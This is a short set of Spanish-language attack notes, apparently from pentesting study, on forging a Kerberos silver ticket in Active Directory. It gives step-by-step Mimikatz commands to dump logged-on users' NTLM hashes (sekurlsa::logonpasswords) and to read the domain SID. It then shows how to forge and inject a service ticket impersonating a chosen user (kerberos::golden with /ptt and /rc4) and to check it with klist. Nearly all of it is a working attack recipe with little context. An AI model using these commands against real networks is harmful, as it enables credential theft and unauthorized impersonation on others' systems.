Para crear un silver ticket necesitamos:

- SPN password hash
- Domain SID
- Target SPN


### Conseguir el NTLM hash de un user si está logueado en nuestra misma máquina (siendo admins)

    .\Mimikatz

Luego:

    privilege::debug
Luego

    sekurlsa::logonpasswords


### Conseguir el domain SID

    Whoami /user

Extraemos el SID evadiendo el último segmento

### Creación del ticket

    .\mimikatz.exe

luego:

    privilege::debug

luego:

    kerberos::golden /sid:<sid> /domain:<domain> /ptt /target:<target> /service:<servicio> /rc4:<hash> /user:<user_a_impersonar>

salimos de mimikatz y vemos si el ticket existe en nuestra pc

    klist

Intentamos acceder nuevamente al servicio
